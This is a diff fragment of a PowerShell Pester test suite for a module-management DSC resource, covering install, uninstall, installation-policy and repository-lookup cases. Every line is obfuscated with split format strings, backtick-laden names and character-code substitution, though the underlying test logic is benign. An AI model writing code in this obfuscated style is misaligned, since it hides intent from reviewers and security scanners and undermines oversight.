+                        ${gE`T`T`A`RgeTr`Es`ouRcEres`ULT}."AlLO`WCLob`BeR" | &("{1}{0}{2}"-f'ul','Sho','d') -Be ${F`A`lsE}
+                        ${GetT`AR`GE`TR`eSOuRCE`Res`ULt}."SkI`ppubLIsH`Er`c`hE`cK" | &("{2}{0}{1}" -f'ou','ld','Sh') -Be ${Fa`lSe}
+
+                        &("{0}{1}{3}{2}{4}"-f 'Assert','-M','kCal','oc','led') -CommandName ("{4}{2}{0}{1}{3}"-f 'ightM','odu','-R','le','Get') -Exactly -Times 1 -Scope ('It')
+                        &("{0}{2}{1}{3}" -f'Assert-Mock','le','Cal','d') -CommandName ("{5}{2}{1}{3}{0}{4}"-f 'pository','duleR','o','e','Name','Get-M') -Exactly -Times 0 -Scope ('It')
+                        &("{0}{3}{1}{2}" -f 'Assert-','kC','alled','Moc') -CommandName ("{4}{1}{3}{6}{2}{5}{0}"-f 'cy','n','a','s','Get-I','tionPoli','tall') -Exactly -Times 0 -Scope ('It')
+                    }
+                }
+            }
+        }
+
+        &("{1}{0}{2}" -f 'e','D','scribe') ((("{5}{1}{0}{2}{3}{7}{6}{4}"-f 'duleID4Set-Ta','_PSMo','rgetR','e','ce','MSFT','ur','so'))."R`epLACE"(([CHAr]73+[CHAr]68+[CHAr]52),[STring][CHAr]92)) -Tag 'Set','BVT' {
+            &("{2}{1}{0}" -f 'xt','te','Con') ("{1}{7}{4}{8}{0}{5}{2}{9}{6}{3}"-f ' no','W',' t','state',' system ','t in',' desired ','hen the','is','he') {
+                &("{0}{2}{1}" -f'Con','t','tex') ("{1}{2}{3}{4}{6}{7}{0}{5}"-f 'rese','Whe','n the confi','g','uration ','nt','should',' be p') {
+                    &("{1}{3}{2}{0}"-f'l','B','l','eforeA') {
+                        &("{0}{1}" -f'M','ock') -CommandName ("{1}{2}{0}" -f'ule','F','ind-Mod') -MockWith ${MOC`KF`InDm`oDulE}
+                        &("{0}{1}"-f 'Moc','k') -CommandName ("{0}{2}{3}{1}"-f 'I','dule','nsta','ll-Mo')
+                    }
+
+                    &("{1}{2}{0}" -f 'xt','Co','nte') ((("{2}{3}{6}{4}{1}{5}{0}"-f '}','d','Whe','n the r','y is {0}{0}Truste','{0}{0','epositor'))  -f  [CHAR]39) {
+                        &("{2}{0}{1}"-f'reA','ll','Befo') {
+                            &("{1}{0}"-f'ock','M') -CommandName ("{4}{2}{1}{0}{3}"-f 'nP','tallatio','et-Ins','olicy','G') -MockWith ${m`OcK`geTin`S`TAl`la`TiO`NPolI`C`Y_Tr`USted}
+                        }
+
+                        &('It') ("{1}{4}{5}{3}{0}{10}{15}{9}{2}{12}{16}{13}{8}{14}{7}{11}{6}" -f' I','S','e','he','hould call ','t','meters','ect ',' c','l','nst','para',' ','e','orr','all-Modu','with th') {
+                            { &("{1}{3}{4}{2}{0}"-f'e','Set-','rgetResourc','T','a') -Name ${mocKmO`duL`e`NAME} } | &("{0}{1}{2}"-f'S','h','ould') -Not -Throw
+
+                            &("{2}{0}{1}{3}"-f 'C','alle','Assert-Mock','d') -CommandName ("{2}{1}{0}{3}" -f 'dul','d-Mo','Fin','e') -Exactly -Times 1 -Scope ('It')
+                            &("{1}{3}{2}{0}" -f'd','Ass','t-MockCalle','er') -CommandName ("{2}{5}{4}{0}{1}{3}" -f 'ationP','olic','Get-Inst','y','ll','a') -Exactly -Times 1 -Scope ('It')
+                            &("{1}{4}{3}{0}{2}"-f'a','A','lled','MockC','ssert-') -CommandName ("{1}{3}{2}{0}"-f 'odule','Insta','M','ll-') -ParameterFilter {
+                                ${I`NPUtObJ`e`ct}."n`AMe" -eq ${MOcKM`oDu`LeNAMe}
+                            } -Exactly -Times 1 -Scope ('It')
+                        }
+                    }
+
+                    &("{1}{0}"-f'ext','Cont') ((("{7}{6}{2}{11}{5}{3}{10}{0}{1}{4}{8}{12}{9}" -f '0}T','ru',' ','icy is {0}','s','ionPol','en','Wh','ted{0','}','{','the Installat','}{0')) -F[cHaR]39) {
+                        &("{0}{1}{2}" -f 'Befor','eA','ll') {
+                            &("{0}{1}"-f'Mo','ck') -CommandName ("{5}{6}{1}{0}{4}{3}{2}" -f 'tall','s','icy','Pol','ation','G','et-In') -MockWith ${M`Ockg`etInsTA`lLa`Ti`O`N`p`olICY_NO`TtRUSteD}
+                        }
+
+                        &('It') ("{5}{2}{0}{9}{3}{4}{1}{7}{8}{6}" -f 'd call','wi','ul',' Install-Modul','e ','Sho',' parameters','t','h the correct',' the') {
+                            { &("{0}{2}{4}{5}{1}{3}" -f'Se','r','t-Ta','ce','rgetReso','u') -Name ${MoCK`MoDulEnA`Me} -InstallationPolicy ("{0}{2}{1}" -f'Tr','sted','u') } | &("{0}{1}"-f'Shou','ld') -Not -Throw
+
+                            &("{4}{0}{1}{2}{3}" -f 'rt-','MockC','all','ed','Asse') -CommandName ("{2}{3}{1}{0}"-f 'le','Modu','Fin','d-') -Exactly -Times 1 -Scope ('It')
+                            &("{5}{0}{3}{4}{2}{1}" -f'ssert-','lled','a','Mo','ckC','A') -CommandName ("{4}{1}{3}{5}{0}{2}{6}" -f'on','t-Inst','Poli','a','Ge','llati','cy') -Exactly -Times 1 -Scope ('It')
+                            &("{2}{1}{0}{3}" -f 'ert-MockC','s','As','alled') -CommandName ("{0}{3}{1}{2}" -f 'In','Mod','ule','stall-') -ParameterFilter {
+                                ${I`NpU`T`oBJeCt}."Na`mE" -eq ${MOc`KMOD`ULEnA`me}
+                            } -Exactly -Times 1 -Scope ('It')
+                        }
+                    }
+
+                    &("{1}{0}"-f't','Contex') ((("{4}{10}{0}{6}{1}{3}{9}{11}{5}{8}{7}{2}{12}"-f 'the ','p','{0}{0','o','W','ory i','Re','y','s {0}{0}PSGaller','s','hen ','it','}')) -F[ChAR]39) {
+                        &("{1}{0}{2}" -f 'l','BeforeA','l') {
+                            &("{0}{1}"-f'Moc','k') -CommandName ("{2}{3}{4}{5}{1}{0}"-f'y','lic','Get-','In','st','allationPo') -MockWith ${m`OC`k`gE`TInS`TallAtIonPOLICy_t`Ru`s`TeD}
+                            &("{0}{1}"-f'Moc','k') -CommandName ("{0}{1}{2}{3}" -f 'Test-Pa','rame','te','rValue')
+                        }
+
+                        &('It') ("{7}{5}{8}{2}{9}{10}{3}{15}{14}{12}{16}{6}{13}{0}{4}{17}{11}{1}"-f ' ','ers',' ','tal','cor','o',' th','Sh','uld','call ','the Ins',' paramet','le','e','du','l-Mo',' with','rect') {
+                            { &("{3}{5}{4}{0}{2}{1}" -f 'etR','urce','eso','Set-','arg','T') -Name ${mO`C`kM`OdULeNAmE} -Repository ("{0}{1}{2}"-f'PSGa','ller','y') -RequiredVersion ("{0}{1}" -f '1.','0.0.0') } | &("{0}{1}"-f'Sho','uld') -Not -Throw
+
+                            &("{0}{2}{3}{1}"-f'Asser','alled','t-Moc','kC') -CommandName ("{0}{3}{2}{4}{1}" -f'Get-I','y','tallationPoli','ns','c') -Exactly -Times 1 -Scope ('It')
+                            &("{3}{2}{1}{0}{4}"-f 'kCall','oc','M','Assert-','ed') -CommandName ("{0}{1}{2}{3}" -f'Fi','nd-','M','odule') -ParameterFilter {
+                                ${n`AmE} -eq ${mo`ckM`oduLENAmE} -and ${RE`PoS`ItOry} -eq ("{1}{0}"-f 'allery','PSG')
+                            } -Exactly -Times 1 -Scope ('It')
+
+                            &("{0}{4}{5}{1}{2}{3}" -f'As','al','l','ed','ser','t-MockC') -CommandName ("{1}{4}{2}{3}{0}" -f'le','In','al','l-Modu','st') -ParameterFilter {
+                                ${in`PUtoB`JEcT}."na`ME" -eq ${MOc`kmOD`U`LEn`Ame} -and ${I`NPu`TO`BJeCt}."rEp`OsITo`Ry" -eq ("{2}{1}{0}" -f'llery','SGa','P')
+                            } -Exactly -Times 1 -Scope ('It')
+                        }
+                    }
+
+                    &("{0}{2}{1}"-f 'Conte','t','x') ((("{0}{15}{5}{4}{8}{3}{10}{1}{18}{6}{19}{12}{14}{9}{7}{2}{17}{13}{11}{16}"-f 'Whe','U','az2',' is az2','l','ionPo','az2az','ory is ','icy','t','az2','z',' ','daz2a','the reposi','n the Installat','2','az2Untruste','ntrusted','2 and'))."r`ePLaCE"(([chaR]97+[chaR]122+[chaR]50),[STRing][chaR]39)) {
+                        &("{0}{1}{2}"-f'Bef','oreA','ll') {
+                            &("{0}{1}"-f'Moc','k') -CommandName ("{0}{4}{5}{3}{1}{2}" -f 'Get-','a','tionPolicy','stall','I','n') -MockWith ${mOck`GeTiN`s`TAll`ATIonPOl`icY_n`ottRUsTed}
+                        }
+
+                        &('It') ("{2}{7}{6}{1}{5}{4}{8}{3}{0}"-f 'or','ec','Sh','r','e','t ','ld throw the corr','ou','r') {
+                            { &("{1}{3}{2}{0}"-f 'ource','Se','etRes','t-Targ') -Name ${mo`CKmODUlENA`mE} } |
+                                &("{1}{0}" -f'd','Shoul') -Throw (${l`oCA`l`Izedd`ATa}."I`Ns`TAl`lAtIO`NpolicyF`A`iLed" -f ("{0}{2}{1}"-f 'Unt','usted','r'), ("{2}{0}{1}" -f 'e','d','Untrust'))
+                        }
+                    }
+
+                    &("{1}{0}{2}" -f 'n','Co','text') ("{10}{9}{8}{0}{3}{7}{1}{5}{4}{2}{6}" -f 'modul','n','un','e','not be fo','ame can','d',' ',' ','n the','Whe') {
+                        &("{1}{0}{2}{3}" -f'f','Be','oreAl','l') {
+                            &("{0}{1}" -f'Mo','ck') -CommandName ("{1}{2}{0}" -f'ule','Find-Mo','d') -MockWith {
+                                throw ("{2}{1}{0}" -f 'ror','ocked er','M')
+                            }
+                        }
+
+                        &('It') ("{4}{0}{2}{3}{5}{1}" -f 'h','rror','ould throw the c','or','S','rect e') {
+                            { &("{1}{0}{2}{3}" -f'rget','Set-Ta','Reso','urce') -Name ${mOc`k`mOd`UL`ENaMe} } |
+                                &("{0}{1}" -f'Shoul','d') -Throw (${lOcal`iZEdD`ATa}."M`ODule`NOTf`oUn`di`NrEp`OSI`ToRY" -f ${moCK`MoDU`L`ENA`ME})
+                        }
+                    }
+                }
+
+                &("{2}{1}{0}" -f't','ontex','C') ("{1}{6}{8}{9}{4}{5}{3}{0}{2}{7}"-f 'ab','Whe','se','be ','iguration shou','ld ','n','nt',' ','the conf') {
+                    &("{1}{0}" -f 't','Contex') ("{0}{5}{7}{13}{8}{15}{4}{11}{10}{9}{6}{12}{3}{1}{2}{14}"-f'W','i','o',' has a single vers','li','h','t','en ','a','e ','g a modul','n','hat','uninst','n','l') {
+                        &("{2}{1}{0}" -f 'eAll','for','Be') {
+                            &("{1}{0}" -f'ock','M') -CommandName ("{2}{0}{3}{1}" -f'tM','dule','Get-Righ','o') -MockWith ${MOC`k`GETrI`GHTmOduL`E_siN`glEMOduLE}
+                            &("{1}{0}"-f'ck','Mo') -CommandName ("{1}{0}{3}{2}"-f 'o','Rem','e-Item','v')
+                        }
+
+                        &('It') ("{3}{1}{0}{8}{4}{6}{5}{2}{7}{9}"-f'all th','c','rrect param','Should ','m with the ','o','c','et','e Remove-Ite','ers') {
+                            { &("{0}{2}{3}{4}{1}" -f'Se','ce','t-T','arget','Resour') -Name ${moCk`modUle`NAme} -Ensure ("{2}{1}{0}"-f'nt','bse','A') } | &("{1}{0}" -f'uld','Sho') -Not -Throw
+
+                            &("{2}{1}{0}{4}{5}{3}"-f '-','rt','Asse','led','MockC','al') -CommandName ("{3}{2}{0}{1}"-f 'tMod','ule','t-Righ','Ge') -Exactly -Times 1 -Scope ('It')
+                            &("{0}{3}{1}{2}{4}"-f 'As','e','rt-M','s','ockCalled') -CommandName ("{2}{0}{1}"-f '-It','em','Remove') -ParameterFilter {
+                                ${PA`Th} -eq ${mockm`Od`UL`eBasE}
+                            } -Exactly -Times 1 -Scope ('It')
+                        }
+                    }
+
+                    &("{1}{0}"-f 'ontext','C') ("{6}{0}{2}{3}{5}{7}{1}{4}" -f 'the ',' be foun','modu','le n','d','ame ca','When ','nnot') {
+                        &("{1}{2}{0}" -f'reAll','B','efo') {
+                            &("{1}{0}"-f 'ock','M') -CommandName ("{2}{1}{0}{3}{4}"-f '-Right','et','G','Mod','ule')
+                        }
+
+                        &('It') ("{0}{2}{3}{5}{4}{6}{1}" -f 'Sho','correct error','ul','d ','ow the','thr',' ') {
+                            { &("{2}{0}{3}{5}{1}{4}"-f'et-Ta','rc','S','rg','e','etResou') -Name ${moc`Km`oDULeNAME} -Ensure ("{0}{2}{1}"-f'Abs','t','en') } |
+                                &("{0}{1}"-f'S','hould') -Throw (${L`O`CaliZE`D`daTA}."MoDuLEwIThRigh`Tpr`OPER`TY`N`o`TfOUNd" -f ${MoCkmO`dUl`E`Name})
+                        }
+                    }
+
+                    &("{0}{1}"-f'Con','text') ("{8}{3}{6}{5}{4}{1}{2}{7}{0}{9}"-f 'be re',' ','ca','hen a ','e','dul','mo','nnot ','W','moved') {
+                        &("{1}{0}"-f'l','BeforeAl') {
+                            &("{1}{0}" -f 'k','Moc') -CommandName ("{1}{2}{0}"-f'le','Get-RightMo','du') -MockWith ${mo`CkgeTRiGhtm`OduLE_sI`Ngl`EmO`dU`le}
+                            &("{0}{1}" -f 'Mo','ck') -CommandName ("{2}{1}{0}{3}" -f 'e-It','v','Remo','em') -MockWith {
+                                throw ("{6}{5}{2}{4}{0}{3}{1}" -f 'er','or','d','r','ule ','remove mo','Mock fail to ')
+                            }
+                        }
+
+                        &('It') ("{0}{3}{4}{1}{5}{2}" -f 'Sh','ct ','or','oul','d throw the corre','err') {
+                            { &("{0}{4}{1}{2}{3}"-f 'Set','Targe','t','Resource','-') -Name ${mOCk`MO`dulEN`AmE} -Ensure ("{2}{0}{1}"-f 'bs','ent','A') } |
+                                &("{1}{2}{0}" -f 'ld','Sho','u') -Throw (${LOc`AliZe`DdA`TA}."FaIltO`UN`iNs`TAll" -f ${MO`CKM`ODuL`ENaMe})
+                        }
+                    }
+                }
+            }
+        }
+
+        &("{1}{0}{2}" -f 'esc','D','ribe') ((("{7}{5}{1}{2}{8}{3}{0}{4}{6}" -f'etRe','SMo','dulejIiT','g','s','P','ource','MSFT_','est-Tar'))."REPla`CE"(([char]106+[char]73+[char]105),[STRiNg][char]92)) -Tag ("{1}{0}" -f'st','Te'),'BVT' {
+            &("{1}{0}"-f't','Contex') ("{9}{0}{1}{5}{8}{6}{2}{7}{3}{4}" -f'en the',' system i','r','d sta','te','s ','n the desi','e','i','Wh') {
+                &("{0}{1}"-f'Cont','ext') ("{5}{1}{2}{4}{0}{3}" -f 'n i','n ','the ','s present','configuratio','Whe') {
+                    &("{1}{2}{0}"-f'reEach','Bef','o') {
+                        &("{1}{0}"-f'k','Moc') -CommandName ("{2}{1}{3}{0}{4}"-f 'urc','getRe','Get-Tar','so','e') -MockWith {
+                            return @{
+                                ("{2}{1}{0}"-f 're','u','Ens')             = ("{0}{1}"-f'Pre','sent')
+                                ("{0}{1}"-f 'Nam','e')               = ${moCKM`oD`UL`En`AME}
+                                ("{2}{0}{1}"-f 'positor','y','Re')         = ${Mockr`EpOSiTo`R`yn`A`mE}
+                                ("{1}{2}{0}" -f'n','Desc','riptio')        = ${moc`K`mod`UlE_V1}."DeSc`Rip`TION"
+                                ("{0}{1}" -f'Gu','id')               = ${Mo`C`k`moD`ULe_V1}."G`UId"
+                                ("{0}{1}{2}"-f 'Modu','leBas','e')         = ${mO`CkM`o`dUlE_V1}."modUl`ebA`se"
+                                ("{2}{0}{1}" -f 'ul','eType','Mod')         = ${mOCkmodu`l`E`_V1}."Mod`UlETY`pE"
+                                ("{0}{2}{1}" -f 'A','thor','u')             = ${m`OCkmOD`UL`e`_V1}."a`Uthor"
+                                ("{3}{1}{4}{0}{2}" -f 'Vers','sta','ion','In','lled')   = ${m`oC`kmOdul`e_V1}."vE`RSIoN"
+                                ("{5}{2}{1}{4}{0}{3}" -f 'onPo','lla','sta','licy','ti','In') = ("{1}{2}{0}"-f'd','Untrust','e')
+                            }
+                        }
+                    }
+
+                    &('It') ('Sho'+'u'+'ld '+'r'+'eturn '+'th'+'e '+'state'+' '+'a'+'s '+('{0}tr'+'ue') -f [ChaR]36) {
+                        ${tESt`T`A`Rge`TREs`OurC`ereSUlt} = &("{1}{4}{5}{0}{3}{2}"-f 'tRes','T','ce','our','est-Targ','e') -Name ${mOcK`mo`d`ULeNamE}
+                        ${TeStt`A`RGEtRe`SO`URceResuLt} | &("{2}{1}{0}" -f'ld','u','Sho') -Be ${t`RUE}
+
+                        &("{2}{1}{3}{0}" -f 'ckCalled','s','A','sert-Mo') -CommandName ("{2}{0}{5}{3}{4}{1}"-f 't','rce','Ge','Reso','u','-Target') -Exactly -Times 1 -Scope ('It')
+                    }
+                }
+
+                &("{1}{0}{2}"-f 'onte','C','xt') ("{4}{5}{0}{7}{3}{6}{2}{1}" -f 'configura','absent',' ','on ','Whe','n the ','is','ti') {
+                    &("{0}{2}{1}" -f'B','eEach','efor') {
+                        &("{0}{1}" -f 'M','ock') -CommandName ("{2}{0}{4}{1}{3}" -f'arg','so','Get-T','urce','etRe') -MockWith {
+                            return @{
+                                ("{1}{0}"-f 'ure','Ens')             = ("{1}{2}{0}"-f'nt','Abs','e')
+                                ("{0}{1}"-f'Na','me')               = ${M`OCkMOD`UlenAme}
+                                ("{1}{0}{2}" -f'itor','Repos','y')         = ${n`Ull}
+                                ("{3}{0}{2}{1}" -f 'e','ription','sc','D')        = ${nu`LL}
+                                ("{1}{0}"-f 'uid','G')               = ${N`ULL}
+                                ("{1}{0}{3}{2}" -f 'le','Modu','se','Ba')         = ${nU`ll}
+                                ("{2}{1}{0}"-f'pe','leTy','Modu')         = ${nU`Ll}
+                                ("{0}{1}"-f 'Autho','r')             = ${nu`lL}
+                                ("{0}{1}{2}{3}{4}"-f 'In','stalledVe','r','si','on')   = ${NU`Ll}
+                                ("{2}{3}{0}{1}" -f 'l','icy','Installati','onPo') = ${N`ULl}
+                            }
+                        }
+                    }
+
+                    &('It') ('Shoul'+'d'+' '+'r'+'etur'+'n '+'t'+'he '+'state'+' '+'as'+' '+('{0'+'}tru'+'e')  -F[CHar]36) {
+                        ${tEsTtARGetreSOur`CER`e`S`U`lT} = &("{0}{4}{1}{2}{3}" -f 'T','t-','TargetResou','rce','es') -Ensure ("{0}{2}{1}" -f'Ab','t','sen') -Name ${mO`CKmO`dULe`NAME}
+                        ${testT`Arge`Tr`E`S`OUrcE`REsuLT} | &("{1}{0}" -f'd','Shoul') -Be ${t`RUE}
+
+                        &("{1}{2}{0}{3}" -f 'ockCal','Assert','-M','led') -CommandName ("{0}{1}{4}{3}{2}"-f 'Get-Tar','g','e','rc','etResou') -Exactly -Times 1 -Scope ('It')
+                    }
+                }
+            }
+
+            &("{0}{1}"-f 'Contex','t') ("{0}{6}{1}{5}{2}{7}{4}{3}"-f 'When the sy',' i','ot in the d','e','ed stat','s n','stem','esir') {
+                &("{1}{0}"-f 'text','Con') ("{6}{5}{4}{7}{8}{3}{0}{2}{1}" -f'b',' present','e','uld ','uratio','g','When the confi','n s','ho') {
+                    &("{2}{0}{1}" -f'fo','reEach','Be') {
+                        &("{1}{0}"-f 'k','Moc') -CommandName ("{1}{4}{0}{3}{2}"-f 'es','Get-Targ','ce','our','etR') -MockWith {
+                            return @{
+                                ("{0}{2}{1}" -f'En','re','su')             = ("{0}{1}"-f 'A','bsent')
+                                ("{0}{1}"-f 'N','ame')               = ${M`ocKModUlE`N`AMe}
+                                ("{1}{3}{0}{2}" -f 'pos','R','itory','e')         = ${m`O`cK`RePosITor`y`NAme}
+                                ("{0}{1}{2}"-f 'Descript','io','n')        = ${MockMo`DU`l`E`_V1}."DEsc`RIpt`iON"
+                                ("{0}{1}" -f'Gu','id')               = ${M`o`CK`moDU`lE_V1}."GU`id"
+                                ("{1}{0}{3}{2}"-f 'd','Mo','Base','ule')         = ${MOcK`Mo`DuL`E_V1}."MOD`U`LEbASE"
+                                ("{2}{0}{1}"-f'yp','e','ModuleT')         = ${mo`CK`MOdu`Le_v1}."m`od`UleTyPE"
+                                ("{1}{0}{2}"-f 'uth','A','or')             = ${MoCkm`oD`ULE_`V1}."au`THOr"
+                                ("{1}{4}{2}{0}{3}"-f'e','I','talledV','rsion','ns')   = ${M`OCkModule`_V1}."VeRs`iOn"
+                                ("{1}{2}{3}{0}{4}"-f 'lationPoli','In','st','al','cy') = ("{1}{0}{2}" -f 'rus','Unt','ted')
+                            }
+                        }
+                    }
+
+                    &('It') ('Sho'+'uld '+'ret'+'urn '+'the'+' '+'stat'+'e '+'as'+' '+('{0}'+'false')  -f  [cHaR]36) {
+                        ${tEst`TaRGeTre`S`ou`R`ceRESUlt} = &("{3}{1}{2}{4}{0}" -f'urce','st-','Targ','Te','etReso') -Name ${M`OcKModulE`N`AMe}
+                        ${TEs`Tta`RGe`TResO`U`Rce`ReS`UlT} | &("{1}{0}" -f 'ould','Sh') -Be ${fA`lsE}
+
+                        &("{1}{3}{0}{2}"-f 'all','A','ed','ssert-MockC') -CommandName ("{0}{3}{1}{2}" -f 'Ge','argetReso','urce','t-T') -Exactly -Times 1 -Scope ('It')
+                    }
+                }
+
+                &("{1}{0}" -f 'xt','Conte') ("{4}{0}{6}{3}{1}{2}{5}" -f'fi',' b','e ab','ation should','When the con','sent','gur') {
+                    &("{2}{1}{0}"-f'Each','fore','Be') {
+                        &("{1}{0}" -f 'k','Moc') -CommandName ("{2}{4}{1}{3}{0}" -f'ource','rgetR','Ge','es','t-Ta') -MockWith {
+                            return @{
+                                ("{0}{1}" -f 'En','sure')             = ("{1}{0}{2}" -f 'esen','Pr','t')
+                                ("{1}{0}"-f 'ame','N')               = ${Moc`Km`OD`U`LENAmE}
+                                ("{0}{1}{2}" -f'Rep','o','sitory')         = ${nU`Ll}
+                                ("{0}{2}{1}" -f 'Des','ion','cript')        = ${Nu`LL}
+                                ("{1}{0}"-f'd','Gui')               = ${n`UlL}
+                                ("{0}{1}{2}"-f 'ModuleB','as','e')         = ${NU`ll}
+                                ("{2}{1}{0}" -f'Type','odule','M')         = ${NU`LL}
+                                ("{0}{1}"-f 'Auth','or')             = ${N`ULl}
+                                ("{4}{2}{3}{0}{1}"-f 'ersio','n','nstalle','dV','I')   = ${N`ULL}
+                                ("{2}{3}{1}{0}{4}"-f 'ic','Pol','In','stallation','y') = ${Nu`Ll}
+                            }
+                        }
+                    }
+
+                    &('It') ('Shoul'+'d '+'retu'+'rn '+'th'+'e '+'sta'+'te '+'a'+'s '+(('5Uxfa'+'lse')  -rePlAcE  ([cHAR]53+[cHAR]85+[cHAR]120),[cHAR]36)) {
+                        ${TEsTtar`gE`TRE`S`ouR`ce`ResUlt} = &("{6}{1}{5}{0}{4}{3}{2}"-f'a','t','ource','es','rgetR','-T','Tes') -Ensure ("{2}{1}{0}"-f 'nt','se','Ab') -Name ${MO`c`kmOD`UlE`NaME}
+                        ${tES`T`Ta`RGE`TrESo`U`RCeRESULT} | &("{0}{2}{1}" -f 'Sh','d','oul') -Be ${fA`L`Se}
+
+                        &("{4}{3}{2}{0}{5}{1}" -f'ckCa','ed','-Mo','ert','Ass','ll') -CommandName ("{1}{4}{0}{3}{2}" -f 'rgetResour','Get-T','e','c','a') -Exactly -Times 1 -Scope ('It')
+                    }
+                }
+            }
+        }
+
+        &("{2}{0}{1}" -f'crib','e','Des') ((("{6}{5}{3}{2}{8}{7}{4}{0}{1}" -f'ryN','ame','duledOy','PSMo','ModuleReposito','_','MSFT','t-','Ge')).("{0}{1}" -f 'R','epLACe').Invoke('dOy','\')) -Tag ("{0}{1}"-f'Help','er') {
+            &("{1}{3}{0}{2}" -f'oreA','Be','ll','f') {
+                
+                &("{0}{1}"-f 'New-I','tem') -Path ${mock`modUlebA`se} -ItemType ("{1}{0}" -f 'e','Fil') -Name ("{1}{3}{5}{2}{4}{0}"-f 'xml','P','n','SGetModul','fo.','eI') -Force
+
+                ${MoCkm`o`Du`lE} = &("{1}{2}{0}"-f 'Object','N','ew-') -TypeName ("{0}{2}{1}"-f'Ob','ect','j') |
+                    &("{2}{0}{3}{1}"-f'd-','ber','Ad','Mem') -Name ("{3}{2}{0}{1}"-f 'eBa','se','l','Modu') -MemberType ("{2}{0}{3}{1}"-f'eProper','y','Not','t') -Value ${m`ockmodU`l`EBasE} -PassThru -Force
+
+                &("{1}{0}"-f'k','Moc') -CommandName ("{0}{2}{1}" -f'Import-Cl','l','ixm') -MockWith {
+                    return &("{2}{1}{0}" -f'ct','-Obje','New') -TypeName ("{1}{0}"-f 'ect','Obj') |
+                        &("{1}{2}{0}" -f'-Member','A','dd') -Name ("{1}{0}{2}{3}"-f 'e','R','pos','itory') -MemberType ("{2}{3}{0}{1}" -f 'er','ty','N','oteProp') -Value ${moc`K`REP`OS`ItOrYN`Ame} -PassThru -Force
+                }
+            }
+
+            &('It') ("{4}{5}{0}{13}{15}{8}{2}{3}{14}{12}{1}{7}{10}{11}{6}{9}"-f'ld','pository ','the cor','re','Sho','u','du','name o','eturn ','le','f a m','o','e',' ','ct r','r') {
+                &("{0}{4}{2}{1}{3}" -f 'Ge','m','oryNa','e','t-ModuleReposit') -Module ${m`ocKMOdu`Le} | &("{1}{0}" -f 'ld','Shou') -Be ${M`ock`Rep`O`s`ITOr`YnaME}
+
+                &("{4}{3}{5}{2}{0}{1}"-f 'Ca','lled','k','-M','Assert','oc') -CommandName ("{2}{0}{1}{3}" -f'mp','ort-Cl','I','ixml') -Exactly -Times 1 -Scope ('It')
+            }
+        }
+
+        &("{1}{2}{0}"-f 'scribe','D','e') ((("{6}{1}{2}{3}{5}{7}{4}{0}"-f'e','e6KxG','e','t-','ul','RightM','MSFT_PSModul','od'))."RePL`ACE"('6Kx',[STRIng][chAR]92)) -Tag ("{0}{1}" -f 'Helpe','r') {
+            &("{0}{2}{1}" -f'Befo','Each','re') {
+                &("{1}{0}" -f 'ock','M') -CommandName ("{3}{0}{1}{4}{2}"-f'Mod','u','sitoryName','Get-','leRepo') -MockWith ${mOckgetm`OD`UlERE`poS`ITo`RYnAMe}
+            }
+
+            &("{1}{0}{2}"-f'n','Co','text') ("{3}{1}{4}{2}{6}{5}{0}" -f 'st','the module ','e','When ','do',' not exi','s') {
+                &("{1}{2}{0}"-f'h','Befor','eEac') {
+                    &("{0}{1}" -f'M','ock') -CommandName ("{2}{0}{1}" -f't-Modu','le','Ge')
+                }
+
+                &('It') ('Sho'+'u'+'ld '+'re'+'turn '+(('vPdnu'+'l'+'l')  -crEpLacE 'vPd',[char]36)) {
+                    &("{3}{4}{1}{2}{0}" -f'e','RightMod','ul','G','et-') -Name ("{4}{1}{2}{3}{0}"-f 'e','ownM','o','dul','Unkn') | &("{1}{0}" -f'ould','Sh') -BeNullOrEmpty
+
+                    &("{4}{2}{3}{1}{0}"-f 'd','e','sert-M','ockCall','As') -CommandName ("{1}{0}{2}"-f 'd','Get-Mo','ule') -Exactly -Times 1 -Scope ('It')
+                }
+            }
+
+            &("{2}{1}{0}" -f'ext','t','Con') ("{1}{2}{3}{0}{6}{4}{5}" -f'e','W','hen on','e v','ule e','xist','rsion of the mod') {
+                &("{1}{2}{3}{0}"-f'ch','Bef','ore','Ea') {
+                    &("{0}{1}"-f'Moc','k') -CommandName ("{3}{2}{1}{0}" -f'e','l','-Modu','Get') -MockWith ${M`o`CK`geT`moDU`le_siNG`L`E`MoDUle}
+                }
+
+                &('It') ("{0}{3}{1}{2}{4}{7}{5}{6}" -f 'Shou','etu','rn t','ld r','h','mod','ule information','e correct ') {
+                    ${GETRi`GhtMoDU`leReS`U`lt} = &("{2}{3}{1}{0}" -f 'Module','t','Get-','Righ') -Name ${MOCKmO`dULE`N`AmE}
+                    ${g`etri`GH`TMoD`UlERe`s`UlT}."NA`mE" | &("{1}{2}{0}"-f'uld','Sh','o') -Be ${MoC`KMoDuL`enAME}
+
+                    &("{2}{1}{0}{4}{3}" -f 'Ca','Mock','Assert-','ed','ll') -CommandName ("{6}{0}{1}{2}{3}{4}{7}{5}" -f'Modu','leRe','po','si','t','ame','Get-','oryN') -Exactly -Times 0 -Scope ('It')
+                    &("{2}{0}{3}{1}{5}{4}" -f'se','Mock','As','rt-','d','Calle') -CommandName ("{2}{0}{3}{1}" -f 'Mod','e','Get-','ul') -ParameterFilter {
+                        ${nA`mE} -eq ${MO`ckM`o`DuLenaMe}
+                    } -Exactly -Times 1 -Scope ('It')
+                }
+            }
+
+            &("{2}{0}{1}"-f'x','t','Conte') ("{10}{11}{2}{0}{5}{8}{13}{4}{9}{6}{12}{7}{3}{1}"-f 'pository is','st','ameter Re','i','d, and one version of th',' spec',' mod','x','i','e','W','hen par','ule e','fie') {
+                &("{2}{0}{1}"-f 'efore','Each','B') {
+                    &("{0}{1}" -f 'Mo','ck') -CommandName ("{0}{2}{1}" -f'Ge','le','t-Modu') -MockWith ${mOcKGE`TmOdULE`_S`InGLe`moDule}
+                }
+
+                &('It') ("{10}{1}{0}{5}{2}{4}{9}{3}{6}{8}{7}{11}" -f 'ret','d ','r','t m','n the cor','u','o','e infor','dul','rec','Shoul','mation') {
+                    ${GeTr`I`gH`TMODUleResuLT} = &("{0}{2}{1}{4}{3}"-f'Get-','ight','R','odule','M') -Name ${mOCK`Mo`D`UlenA`Me} -Repository ${MOC`K`RepOsI`T`or`ynAMe} -Verbose
+                    ${GEtRiGHTmoD`U`LER`Es`U`LT}."Na`Me" | &("{1}{0}" -f'ld','Shou') -Be ${MOck`Mo`dU`L`EName}
+
+                    &("{1}{2}{0}{3}" -f 't-M','Ass','er','ockCalled') -CommandName ("{0}{1}{2}{3}{4}" -f 'Get-','Modul','eRe','posit','oryName') -Exactly -Times 1 -Scope ('It')
